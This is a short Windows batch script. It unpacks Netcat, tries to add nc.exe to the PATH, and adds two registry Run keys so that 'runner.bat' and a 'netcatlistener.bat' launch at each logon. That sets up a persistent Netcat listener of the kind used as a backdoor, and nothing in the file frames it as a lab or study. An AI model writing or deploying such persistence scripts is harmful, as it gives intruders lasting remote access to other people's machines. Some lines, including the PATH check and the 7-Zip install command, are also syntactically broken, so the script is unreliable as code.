@echo off

7z.exe /S /D="C:\Program Files\7-Zip"

REM Unzip the Netcat ZIP file
"C:\Program Files\7-Zip\7z.exe" x netcat-win32-1.11.zip

REM Get the current directory
set currentDirectory=%~dp0

REM Get the path to the Netcat executable file
set ncPath=%CurrentDirectory%\nc.exe

REM Get the current PATH environment variable
set currentPath=%PATH%

REM Check if nc.exe is already on the PATH
if not %currentPath% FIND "nc.exe" == "" (
    REM Add nc.exe to the PATH environment variable
    set PATH=%PATH%;%CurrentDirectory%

)

REM Create the registry value
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "runner" /t REG_SZ /d "%currentDirectory%\runner.bat"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "netcatlistener" /t REG_SZ /d "%currentDirectory%netcatlistener.bat" /f
